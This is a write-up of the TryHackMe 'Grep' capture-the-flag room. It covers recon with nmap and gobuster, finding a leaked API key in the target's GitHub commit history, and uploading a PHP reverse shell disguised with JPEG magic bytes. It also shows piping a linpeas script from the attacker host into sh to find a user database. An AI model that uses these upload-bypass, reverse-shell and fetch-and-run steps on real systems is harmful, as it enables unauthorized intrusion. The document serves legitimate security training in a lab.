# Grep - A challenge that tests your reconnaissance and OSINT skills.
https://tryhackme.com/room/greprtp

Welcome to the OSINT challenge, part of TryHackMe’s Red Teaming Path. In this task, you will be an ethical hacker aiming to exploit a newly developed web application.

SuperSecure Corp, a fast-paced startup, is currently creating a blogging platform inviting security professionals to assess its security. The challenge involves using OSINT techniques to gather information from publicly accessible sources and exploit potential vulnerabilities in the web application.

Start by deploying the machine; Click on the `Start Machine` button in the upper-right-hand corner of this task to deploy the virtual machine for this room.

Your goal is to identify and exploit vulnerabilities in the application using a combination of recon and OSINT skills. As you progress, you’ll look for weak points in the app, find sensitive data, and attempt to gain unauthorized access. You will leverage the skills and knowledge acquired through the Red Team Pathway to devise and execute your attack strategies.

**Note:** Please allow the machine 3 - 5 minutes to fully boot. Also, no local privilege escalation is necessary to answer the questions.

- [Initial Reconnaissance](#initial-reconnaissance)
	- [nmap](#nmap)
	- [website emulation](#website-emulation)
	- [HTTPS](#https)
	- [API folder](#api-folder)
	- [OSINT](#osint)
- [Findings](#findings)
	- [website](#website)
- [What is the API key that allows a user to register on the website?](#what-is-the-api-key-that-allows-a-user-to-register-on-the-website)
- [What is the first flag?](#what-is-the-first-flag)
- [What is the email of the "admin" user?](#what-is-the-email-of-the-admin-user)
- [What is the host name of the web application that allows a user to check an email for a possible password leak?](#what-is-the-host-name-of-the-web-application-that-allows-a-user-to-check-an-email-for-a-possible-password-leak)
- [What is the password of the "admin" user?](#what-is-the-password-of-the-admin-user)
## Initial Reconnaissance

Takings from description 
* SuperSecure Corp
* blogging platform 
* Recon and OSINT skills
* Weak points in the app, find sensitive data, and attempt to gain unauthorized access
### nmap
```
nmap -sV 10.10.81.184     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-29 21:00 EDT
Nmap scan report for 10.10.81.184
Host is up (0.28s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.4.41
Service Info: Host: ip-10-10-81-184.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.19 seconds

nmap -p- -sV 10.10.81.184
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-29 21:01 EDT
Nmap scan report for 10.10.81.184
Host is up (0.28s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
443/tcp   open  ssl/http Apache httpd 2.4.41
51337/tcp open  http     Apache httpd 2.4.41
Service Info: Host: ip-10-10-81-184.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 644.28 seconds
```
### website emulation 
```
gobuster dir -u http://10.10.11.198/ -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -o gobuster_results.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.198/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]

/.htaccess.html       (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 11509]
/index.php            (Status: 200) [Size: 11509]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.11.198/javascript/]
/phpmyadmin           (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 18456 / 18460 (99.98%)
===============================================================
Finished
===============================================================
                                                                 
```

### HTTPS
```
gobuster dir -u https://grep.thm/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster_results.txt -k 

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://grep.thm/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 274]
/.hta                 (Status: 403) [Size: 274]
/.htaccess            (Status: 403) [Size: 274]
/api                  (Status: 301) [Size: 304] [--> https://grep.thm/api/]
/index.php            (Status: 302) [Size: 0] [--> /public/html/]
/javascript           (Status: 301) [Size: 311] [--> https://grep.thm/javascript/]
/phpmyadmin           (Status: 403) [Size: 274]
/public               (Status: 301) [Size: 307] [--> https://grep.thm/public/]
/server-status        (Status: 403) [Size: 274]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

### API folder
```
gobuster dir -u https://grep.thm/api/ -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -o gobuster_results.txt -k

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://grep.thm/api/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 274]
/.html                (Status: 403) [Size: 274]
/.htpasswd.html       (Status: 403) [Size: 274]
/.hta.php             (Status: 403) [Size: 274]
/.hta                 (Status: 403) [Size: 274]
/.hta.html            (Status: 403) [Size: 274]
/.hta.txt             (Status: 403) [Size: 274]
/.htaccess.php        (Status: 403) [Size: 274]
/.htaccess            (Status: 403) [Size: 274]
/.htaccess.txt        (Status: 403) [Size: 274]
/.htaccess.html       (Status: 403) [Size: 274]
/.htpasswd            (Status: 403) [Size: 274]
/.htpasswd.php        (Status: 403) [Size: 274]
/.htpasswd.txt        (Status: 403) [Size: 274]
/config.php           (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 0]
/login.php            (Status: 200) [Size: 34]
/logout.php           (Status: 200) [Size: 42]
/posts.php            (Status: 200) [Size: 25]
/register.php         (Status: 200) [Size: 38]
/upload.php           (Status: 200) [Size: 39]
/uploads              (Status: 301) [Size: 312] [--> https://grep.thm/api/uploads/]

```

### OSINT
Trying to google without hitting getting answers/hints
```
SuperSecure and SearchME -walkthrough -writeup
site:github.com SuperSecure and SearchME -walkthrough -writeup
```

Unfortunely this gave up a hint that it is a repo within GitHub, searching SearchMe and SuperSecure or SuperSecureCorp direct in Github gave a lot of results.  Using gh cli we can automate through the repos and find once with a register.php and get a hit on https://github.com/supersecuredeveloper/searchmecms

Install github cli: https://cli.github.com/

auth cli back to github
```
gh auth login
? Where do you use GitHub? GitHub.com
? What is your preferred protocol for Git operations on this host? HTTPS
? Authenticate Git with your GitHub credentials? Yes
? How would you like to authenticate GitHub CLI? Login with a web browser

! First copy your one-time code: ******
Press Enter to open https://github.com/login/device in your browser...
✓ Authentication complete.
- gh config set -h github.com git_protocol https
✓ Configured git protocol
```

search (with dependency jq)
```
gh search repos searchme --limit 10 --json fullName | jq -r '.[].fullName' | while read repo; do
  echo "Checking $repo"
  branch=$(gh api repos/$repo --jq .default_branch 2>/dev/null) || continue
  match=$(gh api repos/$repo/git/trees/$branch?recursive=1 --jq '.tree[] | select(.path | endswith("register.php"))' 2>/dev/null)
  if [[ -n "$match" ]]; then
    echo "✔️ Found in $repo"
    echo "https://github.com/$repo"
  else
    echo "❌ Not found"
  fi
done

Checking kongnanlive/SearchMenuAnim
❌ Not found
Checking manutorrente/SearchMELI
❌ Not found
Checking niklasb/elgoog
❌ Not found
Checking psweeney101/searchme
❌ Not found
Checking mshahbazsaleem/SearchMeme
❌ Not found
Checking TheGreatPerhaps/SearchMethods
❌ Not found
Checking hacketyt/searchme
❌ Not found
Checking ColeDrain/SearchMedia
❌ Not found
Checking supersecuredeveloper/searchmecms
✔ Found in supersecuredeveloper/searchmecms
https://github.com/supersecuredeveloper/searchmecms
Checking k0keoyo/SearchMeWriteup
❌ Not found
Checking LinuxDoku/searchmetrics

```

## Findings

### website
http://10.10.81.184  loads as Apache2 default webpage, can gobuster a javascript folder and js files but is a dead end 

https://10.10.81.184 gives us,

```
Forbidden
You don't have permission to access this resource.
```

Viewing the certificate for https://10.10.81.184 give us 

```
Issuer Name: 
Country US
State/Province Some-State
Organization SearchME
Common Name grep.thm
```

Adding to host file, 

```
echo "10.10.81.184 grep.thm" | sudo tee -a /etc/hosts
```

We now get

![unnamed](https://github.com/garthheff/CTF-Writeups/blob/main/TryHackMe/files/images/SearchME.png?raw=true)

## What is the API key that allows a user to register on the website?

Registering a user gives us error:
```
Invalid or Expired API key
```

If the required key within github page? 

```
if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'TBA') {
```

Is retracted, if we review the commits we see one for [Fix: remove key](https://github.com/supersecuredeveloper/searchmecms/commit/db11421db2324ed0991c36493a725bf7db9bdcf6 "Fix: remove key")

```
if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'ffe60ecaa8bba2f12b43d1a4b15b8f39') {
```

Above would be fairly time consuming for a large repo, automating by pulling down and searching,
```
git clone https://github.com/supersecuredeveloper/searchmecms.git
cd searchmecms

git log -p -i --all | grep -iE "X-THM-API-Key|key|api"

diff --git a/api/upload.php b/api/upload.php
--- a/api/upload.php
+++ b/api/upload.php
    Fix: remove key
diff --git a/api/register.php b/api/register.php
--- a/api/register.php
+++ b/api/register.php
-if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'ffe60ecaa8bba2f12b43d1a4b15b8f39') {
+if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'TBA') {
diff --git a/api/register.php b/api/register.php
+++ b/api/register.php
+if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'ffe60ecaa8bba2f12b43d1a4b15b8f39') {
+    echo json_encode(array('error' => 'Invalid or Expired API key'));
diff --git a/api/upload.php b/api/upload.php
+++ b/api/upload.php
```

X-THM-API-Key = ffe60ecaa8bba2f12b43d1a4b15b8f39
## What is the first flag?

We can now use this key to register by capturing a failed registration via BurpSuite, sending to repeater,  editing the X-THM-API-Key and sending

![unnamed](https://github.com/garthheff/CTF-Writeups/blob/main/TryHackMe/files/images/registration.png?raw=true)

Or using the browser developer tools, right clicking on the post request and selecting "edit and resend" updating the X-THM-API-Key and sending
![unnamed](https://github.com/garthheff/CTF-Writeups/blob/main/TryHackMe/files/images/registration2.png?raw=true)

Confirming we can login, 

![unnamed](https://github.com/garthheff/CTF-Writeups/blob/main/TryHackMe/files/images/login.png?raw=true)

## What is the email of the "admin" user?

In the following [commit](https://github.com/supersecuredeveloper/searchmecms/commit/8ebad73bbaeaa74a24fe8ec6594f15693c08ae88)  on file upload.php we see the following function for checking that uploads has magic byte of a image, but not extension 

```
function checkMagicBytes($fileTmpPath, $validMagicBytes) {
     $fileMagicBytes = file_get_contents($fileTmpPath, false, null, 0, 4);
     return in_array(bin2hex($fileMagicBytes), $validMagicBytes);
 }
 
 $allowedExtensions = ['jpg', 'jpeg', 'png', 'bmp'];
 $validMagicBytes = [
     'jpg' => 'ffd8ffe0', 
     'png' => '89504e47', 
     'bmp' => '424d'
 ]; 
```

We pull down a reliable php shell 
```
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php

```

Update to attack box or VPN IP
![unnamed](https://github.com/garthheff/CTF-Writeups/blob/main/TryHackMe/files/images/shell%20prep.png?raw=true)

Alter the magic byte, with some testing found I had to add some padding, 

```

printf '\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01#FAKEJPEG\n' > shell.php
cat php-reverse-shell.php >> shell.php

```

Starting a listener 

```
nc -lvnp 1234
```

Upload the shell.php

![unnamed](https://github.com/garthheff/CTF-Writeups/blob/main/TryHackMe/files/images/upload.png?raw=true)

```
{"message":"File uploaded successfully."}
```

Execute the shell.php https://grep.thm/api/uploads/shell.php

![unnamed](https://github.com/garthheff/CTF-Writeups/blob/main/TryHackMe/files/images/shell.png?raw=true)

On attack box we pull down and host linpeas.sh
```
curl https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

sudo python3 -m http.server 80
```

On our shell we pull it down and execute, making sure to update the ip to the Attackbox ip or the VPN tunnel ip 
```
curl 10.4.114.252/linpeas.sh | sh
```

This finds a backup directory under /var/www which contains a users.sql. 
![unnamed](https://github.com/garthheff/CTF-Writeups/blob/main/TryHackMe/files/images/grep_linpeas_backup.png?raw=true)

Within users.sql we find the email: admin@searchme2023cms.grep.thm

```
cat users.sql | grep @
```

![unnamed](https://github.com/garthheff/CTF-Writeups/blob/main/TryHackMe/files/images/grep_linpeas_users_sql.png?raw=true)

## What is the host name of the web application that allows a user to check an email for a possible password leak?

In nmap it showed a website running on 51337
https://10.10.81.184:51337/

checking the certificate, we find leakchecker.grep.thm which we add to the host file
```
echo "10.10.81.184 leakchecker.grep.thm" | sudo tee -a /etc/hosts
```

answer: leakchecker.grep.thm
## What is the password of the "admin" user?
Using https://leakchecker.grep.thm:51337 check  email admin@searchme2023cms.grep.thm

![unnamed](https://github.com/garthheff/CTF-Writeups/blob/main/TryHackMe/files/images/grep_leaked_email.png?raw=true)

# Summary

Was a little bit annoying that google gave github away with walkthrough answer on search result, although was heading in that direction.  Funny little finding, unhashing the APIKEY gives us string johncena

| Hash                             | Type | Result   |
| -------------------------------- | ---- | -------- |
| e8d25b4208b80008a9e15c8698640e85 | md5  | johncena |
Enjoyed this one, had used cloning a github and searching at recent CTF event and was nice to make use of again as in real world there can be a lot more data to go through and manual search could become to time consuming. Did expected more OSINT and needing to grep through lots of data which did send me down some dead ends.